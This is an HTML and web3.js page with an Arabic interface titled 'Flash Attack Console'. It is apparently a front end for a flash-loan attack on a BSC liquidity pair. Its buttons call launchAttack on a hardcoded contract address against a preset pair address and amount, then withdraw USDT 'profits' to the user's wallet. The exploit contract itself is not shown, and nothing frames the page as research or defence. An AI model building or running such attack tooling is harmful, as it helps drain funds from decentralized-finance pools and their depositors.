<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Flash Attack Console</title>
    <style>
        body { background: #030a09; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { width: 340px; background: #0a1412; border-radius: 20px; padding: 25px; text-align: center; border: 1px solid #1a2e2a; }
        .btn { width: 100%; padding: 16px; background: #00ffa3; color: #000; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; margin-top: 20px; }
        input { width: 100%; padding: 12px; background: #142622; color: white; border: 1px solid #253d38; border-radius: 8px; margin: 10px 0; box-sizing: border-box; }
        #status { margin-top: 20px; font-size: 13px; color: #708581; }
    </style>
</head>
<body>

<div class="card">
    <h2>⚡ Flash Attack Console</h2>
    <input type="text" id="pair" placeholder="عنوان الزوج (Pair)" value="0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE">
    <input type="text" id="amount" placeholder="المبلغ (بالـ Wei)" value="1000000000000000000000">

    <button class="btn" onclick="attack()">تنفيذ الهجوم</button>
    <button class="btn" style="background:#ffcc00;margin-top:10px;" onclick="withdraw()">سحب الأرباح</button>
    <div id="status">بانتظار التنفيذ...</div>
</div>

<!-- ✅ بدون مسافات زائدة -->
<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
<script>
    // ✅ عنوان العقد الجديد
    const CONTRACT_ADDR = "0x40123Ae5e3865f6786d14bd111C3C142646630d7";
    
    const ABI = [
        {
            "inputs": [{"name":"_pair","type":"address"},{"name":"_amount","type":"uint256"}],
            "name": "launchAttack",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [{"name":"_token","type":"address"}],
            "name": "withdraw",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ];

    async function attack() {
        const status = document.getElementById('status');
        try {
            if (!window.ethereum) return alert("افتح من Trust Wallet أو MetaMask");
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const web3 = new Web3(window.ethereum);
            const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);

            const pair = document.getElementById('pair').value;
            const amount = web3.utils.toBN(document.getElementById('amount').value);

            status.innerText = "جارٍ تنفيذ الهجوم...";
            await contract.methods.launchAttack(pair, amount).send({ from: accounts[0] });

            status.innerHTML = "<b style='color:#00ffa3;'>✅ نجح! اضغط على سحب الأرباح.</b>";
        } catch (e) {
            status.innerText = "فشل: " + e.message;
        }
    }

    async function withdraw() {
        const status = document.getElementById('status');
        try {
            if (!window.ethereum) return alert("افتح من Trust Wallet أو MetaMask");
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const web3 = new Web3(window.ethereum);
            const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);

            // USDT على BSC
            const USDT = "0x55d398326f99059fF775485246999027B3197955";

            status.innerText = "جارٍ سحب الأرباح...";
            await contract.methods.withdraw(USDT).send({ from: accounts[0] });

            status.innerHTML = "<b style='color:#00ffa3;'>💰 تم السحب إلى محفظتك!</b>";
        } catch (e) {
            status.innerText = "فشل السحب: " + e.message;
        }
    }
</script>
</body>
</html>
